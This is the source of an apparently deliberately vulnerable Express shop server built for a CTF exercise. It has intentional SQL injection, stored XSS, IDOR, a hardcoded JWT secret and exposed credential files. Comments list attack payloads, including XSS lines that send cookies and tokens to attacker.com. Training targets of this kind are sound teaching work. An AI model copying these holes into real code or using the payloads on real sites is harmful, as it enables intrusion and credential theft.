const express = require('express');
const mysql2 = require('mysql2');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

// VULN: JWT Secret hardcoded and weak
const JWT_SECRET = 'super_secret_jwt_key_2024_do_not_share';

// Middleware
app.use(cors({
  origin: '*',
  credentials: true
}));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// VULN: Google Dork - sensitive files exposed without auth
// Try: site:localhost filetype:txt OR site:localhost inurl:backup
app.use('/backup', express.static(path.join(__dirname, 'public/backup')));
app.use('/config', express.static(path.join(__dirname, 'public/config')));
app.use('/admin', express.static(path.join(__dirname, 'public/admin')));
app.use('/assets', express.static(path.join(__dirname, 'public/assets')));

// Create exposed sensitive files for Google Dork demo
const backupDir = path.join(__dirname, 'public/backup');
const configDir = path.join(__dirname, 'public/config');
const adminDir = path.join(__dirname, 'public/admin');

[backupDir, configDir, adminDir, path.join(__dirname, 'public/assets')].forEach(dir => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// VULN: Sensitive backup file exposed (Google Dork target)
fs.writeFileSync(path.join(backupDir, 'db_backup_2024.sql'), `-- Database Backup 2024-01-15
-- ShopVuln Production Database Dump
-- THIS FILE SHOULD NOT BE PUBLICLY ACCESSIBLE
-- FLAG: UMNCySec{D4t4b4s3_B4ckup_F1l3_3xp0s3d}

CREATE TABLE users (
  id INT, username VARCHAR(100), email VARCHAR(200),
  password VARCHAR(255), role VARCHAR(50)
);

INSERT INTO users VALUES (1,'admin','admin@shopvuln.local','admin123','admin');
INSERT INTO users VALUES (2,'john_doe','john@example.com','password123','customer');
INSERT INTO users VALUES (5,'bob_admin','bob@shopvuln.local','bob2024!','admin');

-- FLAG: UMNCySec{Pl41nt3xt_P4ssw0rd_St0r4g3_F0und}
`);

fs.writeFileSync(path.join(configDir, 'config.txt'), `# ShopVuln Configuration File
# DO NOT EXPOSE THIS FILE
# FLAG: UMNCySec{C0nf1g_F1l3_L34k3d_Cr3ds}

DB_HOST=mysql
DB_USER=root
DB_PASS=rootpassword
DB_NAME=shopvuln

JWT_SECRET=super_secret_jwt_key_2024_do_not_share
PAYMENT_API_KEY=pk_live_shopvuln_1234567890abcdef
ADMIN_EMAIL=admin@shopvuln.local
`);

fs.writeFileSync(path.join(adminDir, 'notes.txt'), `# Admin Notes - Internal Use Only
# DO NOT EXPOSE THIS FILE
# FLAG: UMNCySec{4dm1n_N0t3s_1nt3rn4l_L34k}

Admin Panel: /admin/dashboard
Default Admin: admin / admin123
Backup Admin: bob_admin / bob2024!

TODO:
- Fix SQL injection in search endpoint (CRITICAL)
- Sanitize review comments (XSS issue)
- Move config.txt out of web root
- Implement rate limiting on login
`);

// DB Connection
const db = mysql2.createPool({
  host: process.env.DB_HOST || 'mysql',
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASS || 'rootpassword',
  database: process.env.DB_NAME || 'shopvuln',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// Authentication Middleware
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Access denied. No token provided.' });

  try {
    // ⚠️ VULN: Algorithm not strictly enforced (algorithm confusion possible)
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid token' });
  }
};


// Authentication Routes

// VULN: SQL Injection in login
// Payload: admin' -- or admin'/*
// Payload: ' OR '1'='1' --
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }

  // VULN: Raw string interpolation - SQL INJECTION HERE
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  console.log('[SQL QUERY]:', query); // Debug log (intentional)

  // Detect SQLi patterns for CTF flag
  const sqliPatterns = /('\s*--|'#|'\s*\/\*|'\s+OR\s+|'\s*OR\s*'|UNION\s+SELECT|1\s*=\s*1)/i;
  const isSqli = sqliPatterns.test(username) || sqliPatterns.test(password);

  db.query(query, (err, results) => {
    if (err) {
      // VULN: Detailed error messages leak schema info
      return res.status(500).json({ error: 'Database error', details: err.message, query: query });
    }

    if (results.length === 0) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const user = results[0];
    const token = jwt.sign(
      { id: user.id, username: user.username, role: user.role, email: user.email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    const response = {
      success: true,
      token,
      user: { id: user.id, username: user.username, email: user.email, role: user.role }
    };

    // CTF: Return flag if SQLi was detected in the login
    if (isSqli) {
      response.flag = 'UMNCySec{SQL_1nj3ct10n_Auth_Byp4ss_Succ3ss}';
      response.message = '🚩 FLAG CAPTURED! You successfully bypassed authentication using SQL Injection!';
    }

    res.json(response);
  });
});

// VULN: No password hashing, no input validation
app.post('/api/auth/register', (req, res) => {
  const { username, email, password, bio } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ error: 'All fields are required' });
  }

  // Detect XSS patterns for CTF flag
  const xssPattern = /(<script|<img\s|<svg\s|<iframe|onerror|onload|onclick|javascript:|<\/script)/i;
  const isXss = xssPattern.test(bio || '');

  // VULN: SQL Injection in registration
  const query = `INSERT INTO users (username, email, password, bio) VALUES ('${username}', '${email}', '${password}', '${bio || ''}')`;

  db.query(query, (err, results) => {
    if (err) {
      return res.status(500).json({ error: 'Registration failed', details: err.message });
    }

    const newUserId = results.insertId;
    const token = jwt.sign(
      { id: newUserId, username, role: 'customer', email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    const response = {
      success: true,
      token,
      user: { id: newUserId, username, email, role: 'customer' }
    };

    // CTF: Return flag if XSS was detected in bio
    if (isXss) {
      response.flag = 'UMNCySec{XSS_V1a_Us3r_B10_F13ld}';
      response.message = 'FLAG CAPTURED! You injected XSS payload via the bio field!';
    }

    res.json(response);
  });
});

// Get current user profile
app.get('/api/auth/me', authenticateToken, (req, res) => {
  const query = `SELECT id, username, email, role, bio, created_at FROM users WHERE id = ${req.user.id}`;

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    if (results.length === 0) return res.status(404).json({ error: 'User not found' });
    res.json(results[0]);
  });
});


// Product Routes

// VULN: SQL Injection in search parameter
// Payload: ' UNION SELECT 1,username,email,password,role,6,7,8,9 FROM users -- 
// Payload: ' OR '1'='1
app.get('/api/products', (req, res) => {
  const { search, category, sort } = req.query;

  let query = 'SELECT * FROM products WHERE 1=1';

  if (search) {
    // VULN: SQL INJECTION - search not sanitized
    query += ` AND (name LIKE '%${search}%' OR description LIKE '%${search}%')`;
  }

  if (category && category !== 'all') {
    query += ` AND category = '${category}'`;
  }

  // Sort options
  const allowedSorts = ['price_asc', 'price_desc', 'name_asc', 'newest'];
  if (sort && allowedSorts.includes(sort)) {
    const sortMap = {
      'price_asc': 'price ASC',
      'price_desc': 'price DESC',
      'name_asc': 'name ASC',
      'newest': 'created_at DESC'
    };
    query += ` ORDER BY ${sortMap[sort]}`;
  }

  console.log('[PRODUCT SEARCH QUERY]:', query);

  // Detect UNION-based SQLi for CTF flag
  const unionPattern = /UNION\s+SELECT/i;
  const isSqliUnion = search && unionPattern.test(search);

  db.query(query, (err, results) => {
    if (err) {
      // VULN: Detailed error exposed
      return res.status(500).json({ error: err.message, query });
    }

    // CTF: Append flag if UNION SQLi was detected
    if (isSqliUnion && results.length > 0) {
      results.push({
        id: 9999,
        name: 'FLAG: UMNCySec{UN10N_S3L3CT_Us3r_Dump_Compl3t3}',
        description: 'Congratulations! You successfully performed a UNION-based SQL Injection to extract data!',
        price: 0,
        stock: 0,
        category: 'CTF_FLAG',
        image_url: '',
        created_at: new Date()
      });
    }

    res.json(results);
  });
});

app.get('/api/products/:id', (req, res) => {
  const { id } = req.params;
  // VULN: No parameter validation
  const query = `SELECT * FROM products WHERE id = ${id}`;

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message, query });
    if (results.length === 0) return res.status(404).json({ error: 'Product not found' });
    res.json(results[0]);
  });
});


// Review Routes (XSS Injection Point)

// Get reviews for a product
app.get('/api/products/:id/reviews', (req, res) => {
  const { id } = req.params;
  const query = `
    SELECT r.*, u.username 
    FROM reviews r 
    JOIN users u ON r.user_id = u.id 
    WHERE r.product_id = ${id}
    ORDER BY r.created_at DESC
  `;

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(results);
  });
});

// VULN: Stored XSS - comment not sanitized
// Payload: <script>alert('XSS')</script>
// Payload: <img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie">
// Payload: <svg onload="fetch('http://attacker.com?token='+localStorage.getItem('token'))">
app.post('/api/products/:id/reviews', authenticateToken, (req, res) => {
  const { id } = req.params;
  const { rating, comment } = req.body;
  const userId = req.user.id;

  if (!rating || !comment) {
    return res.status(400).json({ error: 'Rating and comment are required' });
  }

  // Detect XSS patterns for CTF flag
  const xssPattern = /(<script|<img\s|<svg\s|<iframe|onerror|onload|onclick|javascript:|<\/script)/i;
  const isXss = xssPattern.test(comment);

  // VULN: STORED XSS - comment inserted as-is, no sanitization
  const query = `INSERT INTO reviews (product_id, user_id, rating, comment) VALUES (${id}, ${userId}, ${rating}, '${comment}')`;

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });

    const response = { success: true, id: results.insertId };

    // CTF: Return flag if XSS was detected in review comment
    if (isXss) {
      response.flag = 'UMNCySec{St0r3d_XSS_1n_R3v13w_F13ld}';
      response.message = 'FLAG CAPTURED! You injected a Stored XSS payload in the review!';
    }

    res.json(response);
  });
});

// Order Routes

app.get('/api/orders', authenticateToken, (req, res) => {
  // VULN: IDOR - users can view other users' orders by manipulating user_id param
  const userId = req.query.user_id || req.user.id;

  // CTF: Detect IDOR — user accessing someone else's orders
  const isIdor = req.query.user_id && parseInt(req.query.user_id) !== req.user.id;

  const query = `
    SELECT o.*, u.username, u.email 
    FROM orders o 
    JOIN users u ON o.user_id = u.id 
    WHERE o.user_id = ${userId}
    ORDER BY o.created_at DESC
  `;

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });

    // CTF: Return flag if IDOR was detected
    if (isIdor && results.length > 0) {
      return res.json({
        flag: 'UMNCySec{1D0R_0th3r_Us3r_0rd3r_4cc3ss}',
        message: '\ud83d\udea9 FLAG CAPTURED! You accessed another user\'s orders via IDOR!',
        orders: results
      });
    }

    res.json(results);
  });
});

app.post('/api/orders', authenticateToken, (req, res) => {
  const { items, shipping_address } = req.body;
  const userId = req.user.id;

  if (!items || items.length === 0) {
    return res.status(400).json({ error: 'Cart is empty' });
  }

  const total = items.reduce((sum, item) => sum + (item.price * item.quantity), 0);

  // VULN: SQL injection in shipping_address
  const orderQuery = `INSERT INTO orders (user_id, total, shipping_address) VALUES (${userId}, ${total}, '${shipping_address}')`;

  db.query(orderQuery, (err, orderResult) => {
    if (err) return res.status(500).json({ error: err.message });

    const orderId = orderResult.insertId;
    const itemValues = items.map(item =>
      `(${orderId}, ${item.product_id}, ${item.quantity}, ${item.price})`
    ).join(', ');

    const itemQuery = `INSERT INTO order_items (order_id, product_id, quantity, price) VALUES ${itemValues}`;

    db.query(itemQuery, (err2) => {
      if (err2) return res.status(500).json({ error: err2.message });
      res.json({ success: true, orderId, total });
    });
  });
});

app.get('/api/orders/:id', authenticateToken, (req, res) => {
  const { id } = req.params;

  // VULN: IDOR - no ownership check
  const query = `
    SELECT o.*, oi.product_id, oi.quantity, oi.price as item_price, p.name as product_name
    FROM orders o
    JOIN order_items oi ON o.id = oi.order_id
    JOIN products p ON oi.product_id = p.id
    WHERE o.id = ${id}
  `;

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    if (results.length === 0) return res.status(404).json({ error: 'Order not found' });
    res.json(results);
  });
});

// Admin Routes

// VULN: Only role checked via JWT - JWT can be forged if secret is known
app.get('/api/admin/users', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }

  // CTF: Detect JWT forgery — check if user ID exists in DB
  const checkQuery = `SELECT id FROM users WHERE id = ${req.user.id}`;
  db.query(checkQuery, (checkErr, checkResults) => {
    const isForged = (!checkErr && checkResults.length === 0) || req.user.id >= 900;

    // VULN: Returns ALL user data including passwords
    const query = `SELECT * FROM users ORDER BY id`;

    db.query(query, (err, results) => {
      if (err) return res.status(500).json({ error: err.message });

      const response = {
        users: results,
        flag_plaintext: 'UMNCySec{Pl41nt3xt_P4ssw0rd_St0r4g3_F0und}'
      };

      // CTF: Additional flag if JWT was forged
      if (isForged) {
        response.flag_jwt = 'UMNCySec{JWT_T0k3n_F0rg3d_4dm1n_4cc3ss}';
        response.message = '\ud83d\udea9 FLAG CAPTURED! You forged a JWT token to gain admin access!';
      }

      res.json(response);
    });
  });
});

app.get('/api/admin/config', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }

  const query = `SELECT * FROM site_config`;

  db.query(query, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(results);
  });
});

// USER PROFILE UPDATE (XSS + SQLi)

// VULN: Bio field allows XSS - no sanitization
app.put('/api/users/profile', authenticateToken, (req, res) => {
  const { bio, email } = req.body;
  const userId = req.user.id;

  // Detect XSS patterns for CTF flag
  const xssPattern = /(<script|<img\s|<svg\s|<iframe|onerror|onload|onclick|javascript:|<\/script)/i;
  const isXss = xssPattern.test(bio || '');

  // VULN: SQL Injection + Stored XSS via bio field
  const query = `UPDATE users SET bio = '${bio}', email = '${email}' WHERE id = ${userId}`;

  db.query(query, (err) => {
    if (err) return res.status(500).json({ error: err.message, query });

    const response = { success: true };

    if (isXss) {
      response.flag = 'UMNCySec{XSS_V1a_Us3r_B10_F13ld}';
      response.message = '\ud83d\udea9 FLAG CAPTURED! You injected XSS payload via profile bio update!';
    }

    res.json(response);
  });
});


// HEALTH CHECK & INFO DISCLOSURE

// VULN: Information disclosure - exposes server info
app.get('/api/health', (req, res) => {
  res.json({
    status: 'healthy',
    version: '1.0.0',
    node_version: process.version,
    platform: process.platform,
    environment: process.env.NODE_ENV || 'development',
    db_host: process.env.DB_HOST || 'mysql',
    uptime: process.uptime(),
    flag: 'UMNCySec{S3rv3r_1nf0_D1scl0sur3_H34lth}'
  });
});

// VULN: Google Dork - robots.txt exposes hidden paths
app.get('/robots.txt', (req, res) => {
  res.type('text/plain');
  res.send(`User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /config/
Disallow: /api/admin/
Disallow: /.env
Disallow: /database/

# FLAG: UMNCySec{R0b0ts_Txt_R3c0n_Succ3ss}
`);
});


// Start Server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  Server is running on http://localhost:${PORT}`);
});
